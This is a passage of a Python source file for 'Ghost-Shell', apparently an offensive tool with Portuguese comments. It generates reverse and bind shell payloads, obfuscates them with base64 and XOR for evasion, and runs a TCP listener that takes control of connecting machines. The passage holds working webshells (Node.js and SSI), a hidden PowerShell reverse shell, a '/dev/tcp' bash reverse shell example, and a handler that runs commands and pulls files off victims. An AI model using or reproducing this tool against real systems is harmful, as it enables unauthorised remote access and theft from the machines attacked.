        "  const q=url.parse(req.url,true).query;\n"
        "  if(q.c){exec(q.c,(e,o)=>{res.end(o||'');});}else res.end('ok');\n"
        "}).listen(process.env.PORT||8080);\n"
    ),
    "shtml": (
        "<!--#exec cmd=\"id\" -->"
    ),
}


# ──────────────────────────────────────────────────────────────────
# Encode
# ──────────────────────────────────────────────────────────────────

def encode_b64(payload):
    """Encoda payload em base64 (Linux one-liner e PowerShell)."""
    b64 = base64.b64encode(payload.encode()).decode()
    linux = f"echo {b64} | base64 -d | bash"
    ps_b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
    ps = f"powershell -EncodedCommand {ps_b64}"
    return {"b64": b64, "linux_oneliner": linux, "powershell": ps}


def encode_xor(payload, key=0x41):
    """XOR simples - util para evasao basica."""
    xored = bytes([b ^ key for b in payload.encode()])
    xored_hex = xored.hex()
    decoder = (
        f"python3 -c \""
        f"import sys; d=bytes.fromhex('{xored_hex}');"
        f"exec(bytes([b^{key} for b in d]).decode())\""
    )
    return {"key": hex(key), "xored_hex": xored_hex, "decoder": decoder}


def encode_url(payload):
    """URL encode do payload."""
    import urllib.parse
    return urllib.parse.quote(payload)


def encode_hex(payload):
    """Converte para hex string."""
    return payload.encode().hex()


# ──────────────────────────────────────────────────────────────────
# Generator
# ──────────────────────────────────────────────────────────────────

def gerar_payload(tipo, lhost, lport, encoding=None):
    """Gera payload de reverse/bind shell."""
    if tipo not in PAYLOADS:
        _log("generate", f"Tipo '{tipo}' nao encontrado", "ERRO")
        _log("generate", f"Tipos: {', '.join(sorted(PAYLOADS.keys()))}", "INFO")
        return None

    interprete, template = PAYLOADS[tipo]

    if tipo == "powershell-b64":
        ps_raw = (
            f"$client=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream=$client.GetStream();"
            f"[byte[]]$bytes=0..65535|%{{0}};"
            f"while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{"
            f"$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback=(iex $data 2>&1|Out-String);"
            f"$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
            f"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}}$client.Close()"
        )
        ps_b64 = base64.b64encode(ps_raw.encode("utf-16-le")).decode()
        payload = f"powershell -nop -w hidden -EncodedCommand {ps_b64}"
    else:
        payload = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))

    if encoding == "base64":
        enc = encode_b64(payload)
        return {"tipo": tipo, "payload": payload, "encoded": enc}
    elif encoding == "xor":
        enc = encode_xor(payload)
        return {"tipo": tipo, "payload": payload, "encoded": enc}
    elif encoding == "url":
        return {"tipo": tipo, "payload": payload, "encoded": {"url": encode_url(payload)}}
    elif encoding == "hex":
        return {"tipo": tipo, "payload": payload, "encoded": {"hex": encode_hex(payload)}}

    return {"tipo": tipo, "interprete": interprete, "payload": payload}


def cmd_generate(args):
    """Subcommand: gerar payloads."""
    _secao("PAYLOAD GENERATOR")

    if args.list:
        _secao("TIPOS DISPONIVEIS")
        cats = {}
        for nome, (interp, _) in sorted(PAYLOADS.items()):
            cats.setdefault(interp, []).append(nome)
        for interp, nomes in sorted(cats.items()):
            print(f"\n  {C['G']}{interp}{C['X']}")
            for n in nomes:
                print(f"    {C['BOLD']}{n:<30}{C['X']}")

        _secao("WEBSHELLS")
        for nome in sorted(WEBSHELLS.keys()):
            print(f"  {C['BOLD']}{nome}{C['X']}")
        return

    if not args.lhost or not args.lport:
        _log("generate", "--lhost e --lport sao obrigatorios para gerar payload", "ERRO")
        return

    tipos = args.type if args.type else list(PAYLOADS.keys())

    for tipo in tipos:
        r = gerar_payload(tipo, args.lhost, args.lport, args.encode)
        if not r:
            continue
        _log("PAYLOAD", f"{C['BOLD']}{tipo}{C['X']} [{r.get('interprete','')}]", "OK")
        print(f"\n  {C['Y']}{r['payload']}{C['X']}\n")
        if "encoded" in r:
            for k, v in r["encoded"].items():
                print(f"  {C['DIM']}[{k}]{C['X']} {v}\n")

    if args.webshell:
        _secao("WEBSHELLS")
        for nome, code in WEBSHELLS.items():
            if args.webshell == "all" or args.webshell == nome:
                _log("WEBSHELL", nome, "OK")
                print(f"  {C['Y']}{code}{C['X']}\n")

    if args.output:
        resultados = [gerar_payload(t, args.lhost, args.lport, args.encode)
                      for t in tipos if t in PAYLOADS]
        with open(args.output, "w") as f:
            json.dump(resultados, f, indent=2)
        _log("output", f"Payloads salvos: {args.output}", "OK")


# ──────────────────────────────────────────────────────────────────
# Listener
# ──────────────────────────────────────────────────────────────────

def cmd_listen(args):
    """Subcommand: handler TCP para reverse shells."""
    _secao(f"LISTENER - {args.lhost}:{args.lport}")
    _log("handler", f"Aguardando conexao em {args.lhost}:{args.lport}", "INFO")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((args.lhost, int(args.lport)))
    except OSError as e:
        _log("handler", f"Bind falhou: {e}", "ERRO")
        return
    srv.listen(1)

    if args.multi:
        _log("handler", "Modo multi: aguardando conexoes multiplas (CTRL+C para sair)", "INFO")
        while True:
            try:
                conn, addr = srv.accept()
                t = threading.Thread(target=_shell_interativo, args=(conn, addr, args), daemon=True)
                t.start()
            except KeyboardInterrupt:
                break
    else:
        try:
            conn, addr = srv.accept()
        except KeyboardInterrupt:
            srv.close()
            return
        srv.close()
        _shell_interativo(conn, addr, args)


def _shell_interativo(conn, addr, args):
    """Loop de shell interativo para uma conexao."""
    _log("SHELL", f"Conexao de {C['BOLD']}{addr[0]}:{addr[1]}{C['X']}", "CRITICO")

    if getattr(args, "auto_upgrade", False):
        _log("tty", "Enviando upgrade PTY automatico...", "INFO")
        upgrade_cmds = [
            b"python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
            b"python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
            b"script /dev/null -c bash\n"
        ]
        for cmd in upgrade_cmds:
            conn.sendall(cmd)
            time.sleep(0.5)

    # Obter info basica do shell
    for cmd in [b"id\n", b"uname -a\n", b"whoami\n"]:
        conn.sendall(cmd)
        time.sleep(0.3)

    conn.settimeout(0.5)
    try:
        resp = b""
        for _ in range(20):
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        if resp:
            _log("info", resp.decode("utf-8", errors="replace").strip(), "INFO")
    except Exception:
        pass
    conn.settimeout(None)

    prompt = f"{C['G']}shell>{C['X']} "
    while True:
        try:
            cmd = input(f"\n{prompt}").strip()
        except (EOFError, KeyboardInterrupt):
            _log("handler", "Encerrando sessao", "INFO")
            break
        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit", "bye"):
            _log("handler", "Desconectando", "INFO")
            break
        if cmd.lower() == "upgrade":
            _log("tty", "Dicas de TTY upgrade:", "INFO")
            for metodo, dica in TTY_HINTS.items():
                print(f"\n  {C['BOLD']}[{metodo}]{C['X']}\n  {dica.replace(chr(10), chr(10) + '  ')}")
            continue
        if cmd.lower().startswith("download "):
            fname = cmd[9:].strip()
            _log("download", f"Lendo: {fname}", "INFO")
            conn.sendall(f"cat {fname} | base64 -w0\n".encode())
            time.sleep(1)
            conn.settimeout(5)
            data_b64 = b""
            try:
                while True:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    data_b64 += chunk
            except socket.timeout:
                pass
            conn.settimeout(None)
            try:
                decoded = base64.b64decode(data_b64.strip())
                local = os.path.basename(fname)
                with open(local, "wb") as fh:
                    fh.write(decoded)
                _log("download", f"Salvo: {local} ({len(decoded)} bytes)", "OK")
            except Exception as e:
                _log("download", f"Erro: {e}", "ERRO")
            continue

        try:
            conn.sendall((cmd + "\n").encode())
        except Exception as e:
            _log("handler", f"Erro ao enviar: {e}", "ERRO")
            break

        conn.settimeout(2)
        resp = b""
        try:
            while True:
                chunk = conn.recv(65536)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        except Exception:
            break
        conn.settimeout(None)

        if resp:
            print(resp.decode("utf-8", errors="replace"), end="")

    try:
        conn.close()
    except Exception:
        pass


# ──────────────────────────────────────────────────────────────────
# Encode subcommand
# ──────────────────────────────────────────────────────────────────

def cmd_encode(args):
    """Subcommand: codificar payload arbitrario."""
    _secao("ENCODER")
    payload = args.payload

    if args.method == "base64" or not args.method:
        enc = encode_b64(payload)
        _log("b64", f"Base64: {enc['b64'][:60]}...", "OK")
        _log("b64-linux", enc["linux_oneliner"], "INFO")
        _log("b64-ps", enc["powershell"][:80] + "...", "INFO")
    if args.method == "xor" or not args.method:
        key = int(args.xor_key, 16) if args.xor_key else 0x41
        enc = encode_xor(payload, key)
        _log("xor", f"Key: {enc['key']} | Hex: {enc['xored_hex'][:40]}...", "OK")
        _log("xor-decoder", enc["decoder"], "INFO")
    if args.method == "url" or not args.method:
        _log("url", encode_url(payload), "INFO")
    if args.method == "hex" or not args.method:
        _log("hex", encode_hex(payload)[:60] + "...", "INFO")


# ──────────────────────────────────────────────────────────────────
# Upgrade subcommand
# ──────────────────────────────────────────────────────────────────

def cmd_upgrade(args):
    """Subcommand: mostrar dicas de upgrade de TTY."""
    _secao("TTY UPGRADE HINTS")
    print(f"""
  {C['BOLD']}{C['G']}1. Spawn PTY com Python:{C['X']}
     python3 -c 'import pty;pty.spawn("/bin/bash")'
     python -c 'import pty;pty.spawn("/bin/bash")'

  {C['BOLD']}{C['G']}2. Script (alternativa):{C['X']}
     script /dev/null -c bash
     script -q /dev/null

  {C['BOLD']}{C['G']}3. Colocar shell em background e corrigir terminal:{C['X']}
     CTRL+Z
     stty raw -echo; fg
     reset
     export SHELL=bash
     export TERM=xterm-256color
     stty rows 38 columns 116

  {C['BOLD']}{C['G']}4. Verificar tamanho do terminal (no host atacante):{C['X']}
     stty size
     (copia os valores para o stty rows X columns Y no shell)

  {C['BOLD']}{C['G']}5. Socat full PTY (no host atacante):{C['X']}
     socat file:`tty`,raw,echo=0 tcp-listen:{args.lport if hasattr(args,'lport') else 4444}

  {C['BOLD']}{C['G']}6. Socat full PTY (no alvo):{C['X']}
     socat tcp-connect:{'{LHOST}'}:{'{LPORT}'} exec:bash,pty,stderr,setsid,sigint,sane

  {C['BOLD']}{C['G']}7. rlwrap para historico e autocompletar:{C['X']}
     rlwrap nc -lvnp {args.lport if hasattr(args,'lport') else 4444}

  {C['BOLD']}{C['G']}8. Teclas especiais apos stty raw:{C['X']}
     CTRL+C  - matar processo no shell remoto
     CTRL+Z  - suspender processo
     CTRL+D  - EOF
""")


# ──────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────

_SHELL_HELP = """\033[92mComandos disponiveis:\033[0m
  \033[1mgenerate\033[0m          Gerar payloads de reverse/bind shell
  \033[1mlisten\033[0m            Iniciar listener TCP para receber shell
  \033[1mencode\033[0m            Codificar payload (base64, xor, url, hex)
  \033[1mupgrade\033[0m           Dicas de upgrade de TTY (shell estavel)

\033[92mExemplos:\033[0m
  python ghost-shell.py generate --lhost 10.10.14.1 --lport 4444 --type bash python3 php
  python ghost-shell.py generate --lhost 10.10.14.1 --lport 4444 --encode base64
  python ghost-shell.py generate --list
  python ghost-shell.py listen --lhost 0.0.0.0 --lport 4444
  python ghost-shell.py listen --lhost 0.0.0.0 --lport 4444 --multi --auto-upgrade
  python ghost-shell.py encode --payload "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
  python ghost-shell.py encode --payload "cmd" --method xor --xor-key 0x55
  python ghost-shell.py upgrade --lport 4444

\033[2mUse: python ghost-shell.py <comando> --help  para opcoes de cada comando\033[0m
"""


def main():
    parser = argparse.ArgumentParser(
        prog="ghost-shell",
        description=f"Ghost-Shell v{VERSAO} - Reverse Shell Generator & Listener  |  By Gh0st-Bx1",
        epilog=_SHELL_HELP,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--no-banner", action="store_true", help="Sem banner inicial")

    sub = parser.add_subparsers(dest="comando", title=argparse.SUPPRESS, metavar="comando")

    # generate
    p_gen = sub.add_parser("generate", help="Gerar payloads")
    p_gen.add_argument("--lhost", default=None, help="IP do atacante para reverse shell")
    p_gen.add_argument("--lport", type=int, default=4444, help="Porta do listener (padrao: 4444)")
    p_gen.add_argument("--type", nargs="+", metavar="TIPO",
                       help="Tipo(s) de payload (ex: bash python3 php). Default: todos")
    p_gen.add_argument("--encode", choices=["base64", "xor", "url", "hex"],
                       help="Codificacao do payload")
    p_gen.add_argument("--webshell", metavar="TIPO",
                       help="Mostrar webshell (all, php-simple, php-b64, aspx, jsp, etc)")
    p_gen.add_argument("--list", action="store_true", help="Listar todos os tipos de payload")
    p_gen.add_argument("--output", metavar="FILE", help="Salvar payloads em JSON")

    # listen
    p_listen = sub.add_parser("listen", help="Iniciar listener TCP")
    p_listen.add_argument("--lhost", default="0.0.0.0", help="IP para bind (padrao: 0.0.0.0)")
    p_listen.add_argument("--lport", type=int, default=4444, help="Porta para escutar (padrao: 4444)")
    p_listen.add_argument("--multi", action="store_true", help="Aceitar multiplas conexoes")
    p_listen.add_argument("--auto-upgrade", action="store_true", dest="auto_upgrade",
                           help="Enviar upgrade PTY automaticamente ao conectar")

    # encode
    p_enc = sub.add_parser("encode", help="Codificar payload")
    p_enc.add_argument("--payload", required=True, help="Payload a codificar")
    p_enc.add_argument("--method", choices=["base64", "xor", "url", "hex"],
                       help="Metodo de codificacao (padrao: todos)")
    p_enc.add_argument("--xor-key", metavar="HEX", dest="xor_key",
                       help="Chave XOR em hex (ex: 0x41). Default: 0x41")

    # upgrade
    p_upg = sub.add_parser("upgrade", help="Dicas de TTY upgrade")
    p_upg.add_argument("--lport", type=int, default=4444,
                       help="Porta do listener (usado nos exemplos, padrao: 4444)")

    args = parser.parse_args()

    if not getattr(args, "no_banner", False):
        print(BANNER)

    if not args.comando:
        parser.print_help()
        sys.exit(0)

    dispatch = {
        "generate": cmd_generate,
        "listen": cmd_listen,
        "encode": cmd_encode,
        "upgrade": cmd_upgrade,
    }
    dispatch[args.comando](args)


if __name__ == "__main__":
    main()
